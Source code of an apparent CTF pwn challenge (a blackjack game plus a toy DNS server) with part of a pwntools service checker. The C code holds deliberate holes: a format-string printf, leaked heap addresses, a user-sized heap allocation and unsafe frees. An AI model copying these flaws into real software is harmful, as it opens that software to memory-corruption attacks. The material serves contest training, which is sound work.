%c%c%c%c%c %c %c ", club, club, club, club, club, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club); printf("\n%c %c %c%c %c %c %c %c %c %c ", club, club, spade, spade, diamond, diamond, heart, heart, club, club); printf("\n%c %c %c%c %c %c %c %c %c ", club, club, spade, spade, diamond, diamond, heart, club, club); printf("\n%c%c%c%c%c %c%c %c %c%c %c %c %c %c ", club, club, club, club, club, spade, spade, diamond, diamond, diamond, diamond, heart, club, club); printf("\n%c %c %c%c %c %c%c%c%c %c %c %c%c %c ", club, club, spade, spade, diamond, diamond, diamond, diamond, diamond, diamond, heart, club, club, club); printf("\n%c %c %c%c %c %c %c %c %c ", club, club, spade, spade, diamond, diamond, heart, club, club); printf("\n%c %c %c%c %c %c %c %c %c %c ", club, club, spade, spade, diamond, diamond, heart, heart, club, club); printf("\n%c%c%c%c%c%c %c%c%c%c%c%c%c %c %c %c%c%c%c%c %c %c ", club, club, club, club, club, club, spade, spade, spade, spade, spade, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club); printf("\n"); printf("\n 21 "); printf("\n %c%c%c%c%c%c%c%c %c%c %c%c%c%c%c %c %c ", diamond, diamond, diamond, diamond, diamond, diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade); printf("\n %c%c %c %c %c %c %c %c ", diamond, diamond, heart, heart, club, club, spade, spade); printf("\n %c%c %c %c %c %c %c ", diamond, diamond, heart, heart, club, spade, spade); printf("\n %c%c %c %c%c %c %c %c %c ", diamond, diamond, heart, heart, heart, heart, club, spade, spade); printf("\n %c%c %c %c%c%c%c %c %c %c%c %c ", diamond, diamond, heart, heart, heart, heart, heart, heart, club, spade, spade, spade); printf("\n %c%c %c %c %c %c %c ", diamond, diamond, heart, heart, club, spade, spade); printf("\n %c %c%c %c %c %c %c %c %c ", diamond, diamond, diamond, heart, heart, club, spade, spade); printf("\n %c%c%c %c %c %c%c%c%c%c %c %c ", diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade); printf("\n"); printf("\n 222 111 "); printf("\n 222 111 "); printf("\n 222 111 "); printf("\n 222222222222222 111111111111111 "); printf("\n 2222222222222222 11111111111111111 "); printf("\n"); puts("-*-*-*-*-*首家线上赌场上线了，性感泽哥女装发牌(・∀・)つ *-*-*-*-*-"); printf("\n"); asktitle(); printf("\n"); printf("\n"); //system("pause"); return(0);&#125; //end program void asktitle() // Function for asking player if they want to continue&#123; char choice1; int choice2; printf("\n Are You Ready?"); printf("\n ----------------"); printf("\n (Y/N)\n "); scanf("\n%c",&amp;choice1); while((choice1!='Y') &amp;&amp; (choice1!='y') &amp;&amp; (choice1!='N') &amp;&amp; (choice1!='n')) // If invalid choice entered &#123; printf("\n"); printf("Incorrect Choice. Please Enter Y for Yes or N for No.\n"); scanf("%c",&amp;choice1); &#125; if((choice1 == 'Y') || (choice1 == 'y')) // If yes, continue. Prints menu. &#123; //system("clear"); printf("\nEnter 1 to Begin the Greatest Game Ever Played."); printf("\nEnter 2 to See a Complete Listing of Rules."); printf("\nEnter 3 to Exit Game. (Not Recommended)"); printf("\nChoice: "); scanf("%d", &amp;choice2); // Prompts user for choice if((choice2&lt;1) || (choice2&gt;3)) // If invalid choice entered &#123; printf("\nIncorrect Choice. Please enter 1, 2 or 3\n"); scanf("%d", &amp;choice2); &#125; switch(choice2) // Switch case for different choices &#123; case 1: // Case to begin game // system("clear"); play(); break; case 2: // Case to see rules // system("clear"); rules(); break; case 3: // Case to exit game printf("\nYour day could have been perfect."); printf("\nHave an almost perfect day!\n\n"); //system("pause"); exit(0); break; default: printf("\nInvalid Input"); &#125; // End switch case &#125; // End if loop else if((choice1 == 'N') || (choice1 == 'n')) // If no, exit program &#123; printf("\nYour day could have been perfect."); printf("\nHave an almost perfect day!\n\n"); //system("pause"); exit(0); &#125; return;&#125; // End function void rules() //Prints "Rules of Vlad's Blackjack" list&#123; char choice1; int choice2; printf("\n RULES of VLAD's BLACKJACK"); printf("\n ---------------------------"); printf("\nI."); printf("\n Thou shalt not question the odds of this game."); printf("\n %c This program generates cards at random.", spade); printf("\n %c If you keep losing, you are very unlucky!\n", diamond); printf("\nII."); printf("\n Each card has a value."); printf("\n %c Number cards 1 to 10 hold a value of their number.", spade); printf("\n %c J, Q, and K cards hold a value of 10.", diamond); printf("\n %c Ace cards hold a value of 11", club); printf("\n The goal of this game is to reach a card value total of 21.\n"); printf("\nIII."); printf("\n After the dealing of the first two cards, YOU must decide whether to HIT or STAY."); printf("\n %c Staying will keep you safe, hitting will add a card.", spade); printf("\n Because you are competing against the dealer, you must beat his hand."); printf("\n BUT BEWARE!."); printf("\n %c If your total goes over 21, you will LOSE!.", diamond); printf("\n%c%c%c YOUR RESULTS ARE RECORDED AND FOUND IN SAME FOLDER AS PROGRAM %c%c%c\n", spade, heart, club, club, heart, spade); printf("\nWould you like to go the previous screen? (I will not take NO for an answer)"); printf("\n (Y/N)\n "); scanf("\n%c",&amp;choice1); while((choice1!='Y') &amp;&amp; (choice1!='y') &amp;&amp; (choice1!='N') &amp;&amp; (choice1!='n')) // If invalid choice entered &#123; printf("\n"); printf("Incorrect Choice. Please Enter Y for Yes or N for No.\n"); scanf("%c",&amp;choice1); &#125; if((choice1 == 'Y') || (choice1 == 'y')) // If yes, continue. Prints menu. &#123; // system("clear"); asktitle(); &#125; // End if loop else if((choice1 == 'N') || (choice1 == 'n')) // If no, convinces user to enter yes &#123; // system("clear"); printf("\n I told you so.\n"); asktitle(); &#125; return;&#125; // End function int clubcard() //Displays Club Card Image&#123; //srand((unsigned) time(NULL)); //Generates random seed for rand() function k=rand()%13+1; if(k&lt;=9) //If random number is 9 or less, print card with that number &#123; //Club Card printf("-------\n"); printf("|%c |\n", club); printf("| %d |\n", k); printf("| %c|\n", club); printf("-------\n"); &#125; if(k==10) //If random number is 10, print card with J (Jack) on face &#123; //Club Card printf("-------\n"); printf("|%c |\n", club); printf("| J |\n"); printf("| %c|\n", club); printf("-------\n"); &#125; if(k==11) //If random number is 11, print card with A (Ace) on face &#123; //Club Card printf("-------\n"); printf("|%c |\n", club); printf("| A |\n"); printf("| %c|\n", club); printf("-------\n"); if(player_total&lt;=10) //If random number is Ace, change value to 11 or 1 depending on dealer total &#123; k=11; &#125; else &#123; k=1; &#125; &#125; if(k==12) //If random number is 12, print card with Q (Queen) on face &#123; //Club Card printf("-------\n"); printf("|%c |\n", club); printf("| Q |\n"); printf("| %c|\n", club); printf("-------\n"); k=10; //Set card value to 10 &#125; if(k==13) //If random number is 13, print card with K (King) on face &#123; //Club Card printf("-------\n"); printf("|%c |\n", club); printf("| K |\n"); printf("| %c|\n", club); printf("-------\n"); k=10; //Set card value to 10 &#125; return k; &#125;// End function int diamondcard() //Displays Diamond Card Image&#123; //srand((unsigned) time(NULL)); //Generates random seed for rand() function k=rand()%13+1; if(k&lt;=9) //If random number is 9 or less, print card with that number &#123; //Diamond Card printf("-------\n"); printf("|%c |\n", diamond); printf("| %d |\n", k); printf("| %c|\n", diamond); printf("-------\n"); &#125; if(k==10) //If random number is 10, print card with J (Jack) on face &#123; //Diamond Card printf("-------\n"); printf("|%c |\n", diamond); printf("| J |\n"); printf("| %c|\n", diamond); printf("-------\n"); &#125; if(k==11) //If random number is 11, print card with A (Ace) on face &#123; //Diamond Card printf("-------\n"); printf("|%c |\n", diamond); printf("| A |\n"); printf("| %c|\n", diamond); printf("-------\n"); if(player_total&lt;=10) //If random number is Ace, change value to 11 or 1 depending on dealer total &#123; k=11; &#125; else &#123; k=1; &#125; &#125; if(k==12) //If random number is 12, print card with Q (Queen) on face &#123; //Diamond Card printf("-------\n"); printf("|%c |\n", diamond); printf("| Q |\n"); printf("| %c|\n", diamond); printf("-------\n"); k=10; //Set card value to 10 &#125; if(k==13) //If random number is 13, print card with K (King) on face &#123; //Diamond Card printf("-------\n"); printf("|%c |\n", diamond); printf("| K |\n"); printf("| %c|\n", diamond); printf("-------\n"); k=10; //Set card value to 10 &#125; return k;&#125;// End function int heartcard() //Displays Heart Card Image&#123; // srand((unsigned) time(NULL)); //Generates random seed for rand() function k=rand()%13+1; if(k&lt;=9) //If random number is 9 or less, print card with that number &#123; //Heart Card printf("-------\n"); printf("|%c |\n", heart); printf("| %d |\n", k); printf("| %c|\n", heart); printf("-------\n"); &#125; if(k==10) //If random number is 10, print card with J (Jack) on face &#123; //Heart Card printf("-------\n"); printf("|%c |\n", heart); printf("| J |\n"); printf("| %c|\n", heart); printf("-------\n"); &#125; if(k==11) //If random number is 11, print card with A (Ace) on face &#123; //Heart Card printf("-------\n"); printf("|%c |\n", heart); printf("| A |\n"); printf("| %c|\n", heart); printf("-------\n"); if(player_total&lt;=10) //If random number is Ace, change value to 11 or 1 depending on dealer total &#123; k=11; &#125; else &#123; k=1; &#125; &#125; if(k==12) //If random number is 12, print card with Q (Queen) on face &#123; //Heart Card printf("-------\n"); printf("|%c |\n", heart); printf("| Q |\n"); printf("| %c|\n", heart); printf("-------\n"); k=10; //Set card value to 10 &#125; if(k==13) //If random number is 13, print card with K (King) on face &#123; //Heart Card printf("-------\n"); printf("|%c |\n", heart); printf("| K |\n"); printf("| %c|\n", heart); printf("-------\n"); k=10; //Set card value to 10 &#125; return k;&#125; // End Function int spadecard() //Displays Spade Card Image&#123; // srand((unsigned) time(NULL)); //Generates random seed for rand() function k=rand()%13+1; if(k&lt;=9) //If random number is 9 or less, print card with that number &#123; //Spade Card printf("-------\n"); printf("|%c |\n", spade); printf("| %d |\n", k); printf("| %c|\n", spade); printf("-------\n"); &#125; if(k==10) //If random number is 10, print card with J (Jack) on face &#123; //Spade Card printf("-------\n"); printf("|%c |\n", spade); printf("| J |\n"); printf("| %c|\n", spade); printf("-------\n"); &#125; if(k==11) //If random number is 11, print card with A (Ace) on face &#123; //Spade Card printf("-------\n"); printf("|%c |\n", spade); printf("| A |\n"); printf("| %c|\n", spade); printf("-------\n"); if(player_total&lt;=10) //If random number is Ace, change value to 11 or 1 depending on dealer total &#123; k=11; &#125; else &#123; k=1; &#125; &#125; if(k==12) //If random number is 12, print card with Q (Queen) on face &#123; //Spade Card printf("-------\n"); printf("|%c |\n", spade); printf("| Q |\n"); printf("| %c|\n", spade); printf("-------\n"); k=10; //Set card value to 10 &#125; if(k==13) //If random number is 13, print card with K (King) on face &#123; //Spade Card printf("-------\n"); printf("|%c |\n", spade); printf("| K |\n"); printf("| %c|\n", spade); printf("-------\n"); k=10; //Set card value to 10 &#125; return k;&#125; // End Function int randcard() //Generates random card&#123; // srand((unsigned) time(NULL)); //Generates random seed for rand() function random_card = rand()%4+1; if(random_card==1) &#123; clubcard(); l=k; &#125; if(random_card==2) &#123; diamondcard(); l=k; &#125; if(random_card==3) &#123; heartcard(); l=k; &#125; if(random_card==4) &#123; spadecard(); l=k; &#125; return l;&#125; // End Function void play() //Plays game&#123; int p=0; // holds value of player_total int i=1; // counter for asking user to hold or stay (aka game turns) char choice3; player_total=0; dealer_total=0; cash = cash; cash_test(); printf("\nCash: $%d\n",cash); //Prints amount of cash user has randcard(); //Generates random card player_total = p + l; //Computes player total p = player_total; printf("\nYour Total is %d\n", p); //Prints player total dealer(); //Computes and prints dealer total betting(); //Prompts user to enter bet amount while(i&lt;=21) //While loop used to keep asking user to hit or stay at most twenty-one times // because there is a chance user can generate twenty-one consecutive 1's &#123; if(p==21) //If user total is 21, win &#123; printf("\nUnbelievable! You Win!\n"); won = won+1; cash = cash+bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; if(p&gt;21) //If player total is over 21, loss &#123; printf("\nWoah Buddy, You Went WAY over.\n"); loss = loss+1; cash = cash - bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; if(p&lt;=21) //If player total is less than 21, ask to hit or stay &#123; printf("\n\nWould You Like to Hit or Stay?"); scanf("%c", &amp;choice3); while((choice3!='H') &amp;&amp; (choice3!='h') &amp;&amp; (choice3!='S') &amp;&amp; (choice3!='s')) // If invalid choice entered &#123; printf("\n"); printf("Please Enter H to Hit or S to Stay.\n"); scanf("%c",&amp;choice3); &#125; if((choice3=='H') || (choice3=='h')) // If Hit, continues &#123; randcard(); player_total = p + l; p = player_total; printf("\nYour Total is %d\n", p); dealer(); if(dealer_total==21) //Is dealer total is 21, loss &#123; printf("\nDealer Has the Better Hand. You Lose.\n"); loss = loss+1; cash = cash - bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; if(dealer_total&gt;21) //If dealer total is over 21, win &#123; printf("\nDealer Has Went Over!. You Win!\n"); won = won+1; cash = cash+bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; &#125; if((choice3=='S') || (choice3=='s')) // If Stay, does not continue &#123; printf("\nYou Have Chosen to Stay at %d. Wise Decision!\n", player_total); stay(); &#125; &#125; i++; //While player total and dealer total are less than 21, re-do while loop &#125; // End While Loop&#125; // End Function void dealer() //Function to play for dealer AI&#123; int z; if(dealer_total&lt;17) &#123; // srand((unsigned) time(NULL) + 1); //Generates random seed for rand() function z=rand()%13+1; if(z&lt;=10) //If random number generated is 10 or less, keep that value &#123; d=z; &#125; if(z&gt;11) //If random number generated is more than 11, change value to 10 &#123; d=10; &#125; if(z==11) //If random number is 11(Ace), change value to 11 or 1 depending on dealer total &#123; if(dealer_total&lt;=10) &#123; d=11; &#125; else &#123; d=1; &#125; &#125; dealer_total = dealer_total + d; &#125; printf("\nThe Dealer Has a Total of %d", dealer_total); //Prints dealer total &#125; // End Function void stay() //Function for when user selects 'Stay'&#123; dealer(); //If stay selected, dealer continues going if(dealer_total&gt;=17) &#123; if(player_total&gt;=dealer_total) //If player's total is more than dealer's total, win &#123; printf("\nUnbelievable! You Win!\n"); won = won+1; cash = cash+bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; if(dealer_total&gt;21) //If dealer's total is more than 21, win &#123; printf("\nUnbelievable! You Win!\n"); won = won+1; cash = cash+bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; if(player_total&lt;dealer_total) //If player's total is less than dealer's total, loss &#123; printf("\nDealer Has the Better Hand. You Lose.\n"); loss = loss+1; cash = cash - bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; &#125; else &#123; stay(); &#125; &#125; // End Function void cash_test() //Test for if user has cash remaining in purse&#123; if (cash &lt;= 0) //Once user has zero remaining cash, game ends and prompts user to play again &#123; printf("You Are Bankrupt. Game Over"); //cash = 500; exit(0); //askover(); &#125; if(cash&gt;=WIN_SUM)&#123; int id; int length; char buffer[100]; char *key=0; id = open("/home/tsctf/flag/flag",O_RDONLY,S_IRUSR ); if(id &lt;0)&#123; printf("flag file error~!\n"); exit(0); &#125; length = read(id,buffer,100); if (length&lt;0)&#123; printf("read error~!\n"); exit(0); &#125; buffer[length] = '\0'; length = strlen(buffer); key = malloc(length); for(int i =0 ; i&lt;length;i++)&#123; //printf("%d ",key[i*4]); key[i]=(rand()%256); &#125; //printf("%d",(length/4)*4); for(int i = 0;i&lt;length;i++)&#123; //printf("%2x",key[i]); buffer[i] = buffer[i]^key[i]; &#125; puts("d(`･∀･)b :"); puts(" OK, you win,"); puts("I won't give u real flag :"); write(1,buffer,length); close(id); exit(0); &#125;&#125; // End Function int betting() //Asks user amount to bet&#123; printf("\n\nEnter Bet: $"); scanf("%u", &amp;bet); while ((bet &gt; cash) || (bet == 0))//If player tries to bet more money than player has &#123; printf("\nAre you kidding me? "); printf("\nEnter Bet: "); scanf("%u", &amp;bet); //return bet; &#125;return bet;&#125; // End Function void askover() // Function for asking player if they want to play again&#123; char choice1; printf("\nWould You Like To Play Again?"); printf("\nPlease Enter Y for Yes or N for No\n"); scanf("\n%c",&amp;choice1); while((choice1!='Y') &amp;&amp; (choice1!='y') &amp;&amp; (choice1!='N') &amp;&amp; (choice1!='n')) // If invalid choice entered &#123; printf("\n"); printf("Incorrect Choice. Please Enter Y for Yes or N for No.\n"); scanf("%c",&amp;choice1); &#125; if((choice1 == 'Y') || (choice1 == 'y')) // If yes, continue. &#123; // system("clear"); play(); &#125; else if((choice1 == 'N') || (choice1 == 'n')) // If no, exit program &#123; //fileresults(); printf("\nBYE!!!!\n\n"); //system("pause"); exit(0); &#125; return;&#125; // End function void fileresults() //Prints results into Blackjack.txt file in program directory&#123; FILE *fpresults; //File pointer is fpresults fpresults = fopen(RESULTS, "w"); //Creates file and writes into it if(fpresults == NULL) // what to do if file missing from directory &#123; printf("\nError: File Missing\n"); //system("pause"); exit(1); &#125; else &#123; fprintf(fpresults,"\n\t RESULTS"); fprintf(fpresults,"\n\t---------\n"); fprintf(fpresults,"\nYou Have Won %d Times\n", won); fprintf(fpresults,"\nYou Have Lost %d Times\n", loss); fprintf(fpresults,"\nKeep Playing and Set an All-Time Record!"); &#125; fclose(fpresults); return;&#125; // End Functionvoid handler()&#123; puts("[-] Time out ... \n"); exit(1);&#125;void init() &#123; char *logo = "*******************************************\n" "* _____ _____ _____ _____ _____ *\n" "* |_ _| / ___/ / ___| |_ _| | ___| *\n" "* | | | |___ | | | | | |__ *\n" "* | | \\___ \\ | | | | | __| *\n" "* | | ___| | | |___ | | | | *\n" "* |_| /_____/ \\_____| |_| |_| *\n" "* *\n" "* ------ Welcome to TSCTF FINAL --------- *\n" "* ------ Have a nice day --------- *\n" "* _____ _ __ _ ___ _ *\n" "* | ___| | | | \\ | | / | | | *\n" "* | |__ | | | \\| | / /| | | | *\n" "* | __| | | | |\\ | / / | | | | *\n" "* | | | | | | \\ | / / | | | |___ *\n" "* |_| |_| |_| \\_| /_/ |_| |_____| *\n" "*******************************************\n" "\n"; puts(logo); setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); setvbuf(stderr,0,2,0); signal(14,handler); alarm(200); srand((unsigned) time(NULL)/60); visitor_name = malloc(8); strcpy(visitor_name,"anonym");&#125;void menu()&#123; puts("==GOD.ZE DNS Server=="); puts("1. Login"); puts("2. Add a DNS item"); puts("3. Parsing domain names "); puts("4. Delete DNS item"); puts("5. Exit"); puts("=====================");&#125;void menu1()&#123; puts("=====MENU======"); puts("1. set name"); puts("2. set motto"); puts("3. show motto"); puts("4. Exit"); puts("===============");&#125;void maybe_real_set_name()&#123; scanf("%7s",visitor_name); puts("OK, I know your name :"); printf(visitor_name);&#125;void set_name()&#123; maybe_real_set_name();&#125;void set_motto()&#123; char buffer[0x200] ; read_n(buffer,0x200); motto = strdup(buffer);&#125;int login()&#123; if (login_flag != 0) return -1; char * fmt = "%d"; int opt; while(1)&#123; printf("&gt;"); if(scanf(fmt,&amp;opt)&lt;=0)&#123; exit(0); &#125; switch(opt)&#123; case 1: if((login_flag &amp; 0x01)==0)&#123; login_flag = login_flag|0x01; printf("name:"); set_name(); &#125; break; case 2: if((login_flag &amp;0x10) == 0)&#123; login_flag = login_flag|0x10; printf("motto:"); set_motto(); &#125; break; case 3: if((login_flag &amp;0x100) == 0)&#123; login_flag = login_flag|0x100; if(motto!=0) puts(motto); &#125; break; case 4: return 0; break; default: puts("invalid options\n"); &#125; &#125;&#125;int read_n(char *src,int len)&#123; unsigned int i; for ( i = 0; i &lt; len; i++ ) &#123; if ( read(0, (void *)(i + src), 1) != 1 ) exit(-1); if ( *(src+i) == 10 ) &#123; *(src+i) = 0; return i; &#125; &#125; return i; &#125;int read_int()&#123; char nptr[16]; read_n(nptr, 0xA); return (unsigned int)atoi(nptr);&#125;int check_format(char *ip)&#123; int num =0; for(int i=0;i&lt;0x20;i++)&#123; if(ip[i]=='.')&#123; num += 1; &#125; &#125; if(num!=3)&#123; return -1; &#125; return 0;&#125;void add_DNS()&#123; struct DNS_Node * tmp; unsigned int len,i; char *remark; for ( i = 0; i &lt;= 31 &amp;&amp; DNS_Node_List[i]; ++i ) ; if ( i == 32 ) return 0xFFFFFFFFLL; tmp = malloc(sizeof(struct DNS_Node)); printf("ψ(｀∇´)ψ: Let me leave some clue [%03x]\n",((unsigned int)tmp&amp;0xfff)); strcpy(tmp-&gt;user,visitor_name); printf("input domain: "); read_n(tmp-&gt;domain,0x30); printf("input length:"); len =read_int(); remark = malloc(len+0x20); printf("ψ(｀∇´)ψ: Let me leave some clue [%03x]\n",((unsigned)remark&amp;0xfff)); tmp-&gt;ptr = remark; printf("input remark:"); read_n(remark+0x20,len); printf("input IP:"); read_n(remark,0x20); if(check_format(remark)!=0)&#123; printf("error input,bye!\n"); exit(0); &#125; DNS_Node_List[i]=tmp; printf("Complete\n");&#125;void parse_domain()&#123; char domain[0x30]; struct DNS_Node *tmp=0; int i; printf("Give me ur domain:"); read_n(domain,0x30); for ( i = 0; i &lt;= 31; ++i ) &#123; if ( DNS_Node_List[i] &amp;&amp; !strcmp(domain, DNS_Node_List[i]-&gt;domain) ) &#123; tmp = DNS_Node_List[i]; printf("adder : %s\n",tmp-&gt;user ); printf("IP : %s\n",tmp-&gt;ptr ); printf("remark: %s\n",(tmp-&gt;ptr + 0x20)); printf("---------------------------\n"); &#125; &#125; if ( !tmp ) puts("not find!!"); &#125;void delete_DNS()&#123; char domain[0x30]; struct DNS_Node *tmp; int i,zero,j; printf("Give me bad domain:"); read_n(domain,0x30); zero = 0; for ( i = 0; i &lt;= 31; ++i ) &#123; if ( DNS_Node_List[i] &amp;&amp; !strcmp(domain, DNS_Node_List[i]-&gt;domain) &amp;&amp; !strcmp(visitor_name,DNS_Node_List[i]-&gt;user) ) &#123; zero = 1; tmp = DNS_Node_List[i]; j=i; free(tmp-&gt;ptr); free(tmp); &#125; &#125; if(zero)&#123; DNS_Node_List[j]=0; printf("complete\n" ); &#125; else&#123; puts("not find!!"); &#125;&#125;void main()&#123; asm( "shr $0x16,%rsp\n" "shl $0x16,%rsp\n" "xor $0x188,%rsp\n" "push %rbp\n" "mov %rsp,%rbp\n" "sub $0x20,%rsp\n" ); int option; init(); //menu(); while(1)&#123; menu(); printf("&gt;"); if(scanf("%u",&amp;option)&lt;=0)&#123; exit(0); &#125; switch(option)&#123; case 1: menu1(); login(); break; case 2: add_DNS(); break; case 3: parse_domain(); break; case 4: delete_DNS(); break; case 5: puts("=͟͟͞͞ =͟͟͞͞ ﾍ( ´Д`)ﾉ :"); puts(" [Don't leave me alone, I can give u sh311 !]"); puts(" "); exit(0); break; case 0xbabe: game(); break; &#125; //login(); //game(); &#125;&#125;/*NODE -&gt; USER(8) + DOMAIN(0X30) +PTR(8)CONTENT -&gt; DNS(0X20) + CONTENT(~)*/c Checker123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609#!/usr/bin/env python# coding=utf-8from pwn import *import randomimport threadimport stringimport hashlibimport requestsimport osfrom termcolor import *import jsonimport timecoding_check_level = 1fmt_check_level = 0log_file = 'note_check'debug = 0check = Falsefile_path = '/home/tsctf/binary/pwn'#/Desktop/DNS_Server'if debug: round_time = 300 slog = 1else: round_time = 300 slog = 0class TimeoutError(Exception): def __init__(self, err='timeout'): Exception.__init__(self, err)class ResponseError(Exception): def __init__(self, err='ErrResponse'): Exception.__init__(self, err)class Checker: """ function checker for Question Note """ def __init__(self, _rhost, _port, _timeout): # pwntools init global context global slog context.log_level = 'ERROR' if slog: context.log_level = 'DEBUG' if _timeout: context.timeout = _timeout # check result init self.state = 0 # local variables init self.rhost = remote(_rhost, _port) self.name = '' self.oip = _rhost self.oport = _port def randstr(self, length=10): # generate random string with lowercase result = '' space = string.lowercase for i in range(length): index = random.randint(0, len(space) - 1) result += space[index] return result def md5(self, inputstr): return hashlib.md5(inputstr).hexdigest() def check_login(self): data = self.rhost.recvuntil('=====================\n&gt;') if not data: print_log(colored('[Error] outoftime : ' + self.oip + '\n', 'red'),ip=self.oip) raise TimeoutError self.rhost.sendline("1") self.rhost.recvuntil("===============\n&gt;") self.rhost.sendline("1") self.rhost.recvuntil("name:") name = self.randstr(7) self.rhost.sendline(name) self.rhost.recvuntil('OK, I know your name :\n') recv = self.rhost.recvuntil("&gt;") if name not in recv: print_log(colored('[Error] in login_set_name : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError if ((name+'\n') in recv)&amp;(fmt_check_level!=0): print_log(colored('[Error] bad patch format vul : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.sendline('2') self.rhost.recvuntil('motto:') motto = self.randstr(0x200) self.rhost.send(motto) self.rhost.recvuntil('&gt;') self.rhost.sendline('3') if motto not in self.rhost.recvuntil("&gt;"): print_log(colored('[Error] in login_show_motto : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError def add(self,domain,length,remark,ip): self.rhost.recvuntil('&gt;') self.rhost.sendline('2') self.rhost.recvuntil("domain:") #domain_2 = self.randstr(0x30) self.rhost.sendline(domain) self.rhost.recvuntil("length:") self.rhost.sendline(str(length)) self.rhost.recvuntil("remark:") #remark_2 = self.randstr(0x90) self.rhost.sendline(remark) self.rhost.recvuntil("input IP:") self.rhost.sendline(ip) def delete(self,domain): self.rhost.recvuntil('&gt;') self.rhost.sendline('4') self.rhost.recvuntil('domain:') self.rhost.sendline(domain) def parse(self,domain): self.rhost.recvuntil('&gt;') self.rhost.sendline('3') self.rhost.recvuntil('domain:') self.rhost.sendline(domain) def check_DNS(self): data = self.rhost.recvuntil('=====================\n&gt;') if not data: print_log(colored('[Error] outoftime : ' + self.oip + '\n', 'red'),ip=self.oip) raise TimeoutError self.rhost.sendline("1") self.rhost.recvuntil("===============\n&gt;") self.rhost.sendline("1") self.rhost.recvuntil("name:") name = self.randstr(7) self.rhost.sendline(name) self.rhost.recvuntil('OK, I know your name :\n') self.rhost.recvuntil("&gt;") self.rhost.sendline('4') # add domain_1 = self.randstr(0x30-1) domain_2 = self.randstr(0x30-1) remark_1 = self.randstr(0x50-1) remark_2 = self.randstr(0x90-1) remark_3 = self.randstr(0x110-1) self.add(domain_1,0x50,remark_1,"127.0.0.1") self.add(domain_1,0x90,remark_2,"127.0.0.1") self.add(domain_2,0x110,remark_3,"0.0.0.0") self.parse(domain_1) self.rhost.recvuntil("adder : ") if name not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("IP : ") if "127.0.0.1" not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("remark: ") if remark_1 not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("adder : ") if name not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("IP : ") if "127.0.0.1" not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("remark: ") if remark_2 not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.parse(domain_2) self.rhost.recvuntil("adder : ") if name not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("IP : ") if "0.0.0.0" not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("remark: ") if remark_3 not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.delete(domain_2) self.parse(domain_2) if "not find!!" not in self.rhost.recvuntil("==GOD"): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError def get_num(self): self.rhost.recvuntil('Your Total is ') return int(self.rhost.recvline()[:-1]) def get_money(self): self.rhost.recvuntil("Cash: $") return int(self.rhost.recvline()[:-1]) def round(self): self.money = self.get_money() if (self.money!= self.pre_money): print_log(colored('[Error] in game : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("Bet: $") self.rhost.sendline('1') self.rhost.recvuntil('Please Enter H to Hit or S to Stay.') self.rhost.sendline('H') while (1): num = self.get_num() tmp = self.rhost.recv() #print '[+]',tmp,'[-]' if 'Would You Like to Hit or Stay?' in tmp: self.rhost.sendline("H") elif 'Enter Y for Yes or N for No' in tmp: win_num = int(tmp.split(' Wins and ')[0][-1:]) loss_num = int(tmp.split(' Wins and ')[1][:1]) if self.win &lt; win_num: self.win = win_num return 1 if self.loss &lt; 